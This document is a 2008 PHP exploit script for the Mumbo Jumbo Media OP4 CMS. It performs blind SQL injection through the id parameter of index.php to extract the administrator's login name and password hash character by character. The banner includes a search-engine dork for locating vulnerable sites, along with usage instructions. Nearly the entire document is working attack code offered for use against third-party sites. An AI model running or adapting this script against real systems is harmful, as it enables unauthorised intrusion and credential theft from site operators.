Mumbo Jumbo Media OP4 Remote Blind SQL Injection Exploit
========================================================




<?php
ini_set("max_execution_time",0);
print_r(&#039;
###############################################################
#
#   Mumbo Jumbo Media - OP4 - Blind SQL Injection Exploit     
#                                                             
#      Vulnerability discovered by: Lidloses_Auge             
#      Exploit coded by:            Lidloses_Auge
#      Greetz to:                   Free-Hack, GPM
#      Date:                        13.04.2008
#
###############################################################
#                                                             
#      Dork:  "mumbo jumbo media" + inurl:"index.php"
#      Usage: php &#039;.$argv[0].&#039; [Target] [Page ID] [Admin ID]
#      Example for "http://www.site.com/cms/index.php?id=300"
#      => php &#039;.$argv[0].&#039; http://www.site.com/cms/ 300 1
#                                                             
###############################################################
&#039;);
if ($argc > 1) {
print_r(&#039;
&#039;);
   echo &#039;Searching for Admin: &#039;;
   for($i=1; $i <= 50; $i++) { 
      $temp1 = file_get_contents($argv[1].&#039;index.php?id=&#039;.$argv[2].&#039;+and+length((select+kennung+from+op4_admin+where+id=&#039;.$argv[3].&#039;))=&#039;.$i.&#039;--&#039;);
      if (strpos($temp1,&#039;Die angeforderte Seite existiert nicht&#039;) == 0) {
         $adlen = $i;
         $i = 50;
      }
   }
   for($i=1; $i <= $adlen; $i++) {
      for($zahl=48; $zahl <= 122; $zahl++) {
         $temp = file_get_contents($argv[1].&#039;index.php?id=&#039;.$argv[2].&#039;+and+ascii(substring((select+kennung+from+op4_admin+where+id=&#039;.$argv[3].&#039;),&#039;.$i.&#039;,1))=&#039;.$zahl.&#039;--&#039;);
         if (strpos($temp,&#039;Die angeforderte Seite existiert nicht&#039;) == 0) {
            echo chr($zahl);
            $zahl = 122;
         }
         if ($zahl == 57) {
            $zahl = 96;
         }
      }
   }
print_r(&#039;
&#039;);
   echo &#039;Searching for Hash:  &#039;;
   for($i=1; $i <= 32; $i++) { 
      for($zahl=48; $zahl <= 102; $zahl++) {
         if ($check = 0) {
            $temp2 = file_get_contents($argv[1].&#039;index.php?id=&#039;.$argv[2].&#039;+and+ascii(substring((select+passwort+from+op4_admin+where+id=&#039;.$argv[3].&#039;),&#039;.$i.&#039;,1))<97--&#039;);
            if (strpos($temp2,&#039;Die angeforderte Seite existiert nicht&#039;) == 0) {
               $zahl = 97;
               $check = 1;
            }
         }
         $temp = file_get_contents($argv[1].&#039;index.php?id=&#039;.$argv[2].&#039;+and+ascii(substring((select+passwort+from+op4_admin+where+id=&#039;.$argv[3].&#039;),&#039;.$i.&#039;,1))=&#039;.$zahl.&#039;--&#039;);
         if (strpos($temp,&#039;Die angeforderte Seite existiert nicht&#039;) == 0) {
            echo chr($zahl);
            $zahl = 102;
         }
         if ($zahl == 57) {
            $zahl = 97;
         }
      }
      $check = 0;
   }
}
?>



